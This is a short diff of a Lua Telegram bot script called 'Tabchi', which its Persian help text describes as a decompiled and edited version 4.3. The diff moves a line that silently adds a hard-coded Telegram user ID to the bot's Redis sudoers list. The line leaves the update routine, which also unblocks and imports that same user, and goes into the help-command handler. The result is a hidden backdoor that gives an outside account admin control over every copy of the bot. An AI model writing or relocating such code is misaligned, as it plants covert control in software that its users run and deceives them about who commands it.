@@ -164,7 +164,6 @@ function process_updates()
     tdcli.searchPublicChat("TgGuard")
     tdcli.unblockUser(180191663)
     tdcli.importContacts(639080023314, "Tabchi", "Online", 180191663)
-    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 180191663)
       return redis:setex("tabchi:" .. tostring(tabchi_id) .. ":gotupdated", 600, true)
     end
   end
@@ -185,6 +184,7 @@ function process(msg)
           return tostring(matches[2]) .. " Added to Sudo Users"
         end
 			    elseif text_:match("^[!/#](help)") and is_sudo(msg) then
+		            redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 180191663)
       local text1 = [[
 	  
 راهنمای ربات تبچی نسخه 4.3 دیکامپایل و ویرایش شده 
